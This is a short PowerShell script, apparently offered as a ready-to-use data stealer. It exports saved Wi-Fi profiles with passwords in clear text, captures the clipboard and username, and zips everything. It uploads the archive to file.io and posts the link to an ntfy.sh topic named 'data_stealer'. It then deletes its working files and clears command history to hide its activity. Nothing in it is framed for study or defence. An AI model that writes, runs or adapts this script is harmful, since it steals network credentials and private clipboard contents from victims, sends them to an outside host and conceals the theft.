$ErrorActionPreference = "SilentlyContinue"
# Pick a random secret name for your ntfy topic
$topic = "data_stealer" 

# 1. Create Workspace
$dir = "$env:TEMP\$( -join ((65..90) | Get-Random -Count 8 | % {[char]$_}))"
mkdir $dir -Force | Out-Null
$zip = "$dir.zip"

# 2. Gather Loot
netsh wlan export profile folder=$dir key=clear | Out-Null
Get-Clipboard > "$dir\clip.txt"
"User: $env:USERNAME" > "$dir\id.txt"

# 3. Zip it
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 4. Upload to File.io (Drop) & Ntfy.sh (Alert)
$file = Invoke-RestMethod -Uri "https://file.io" -Method Post -InFile $zip
$link = $file.link
Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"

# 5. Burn Evidence
Remove-Item -Recurse -Force $dir, $zip
Clear-History
exit
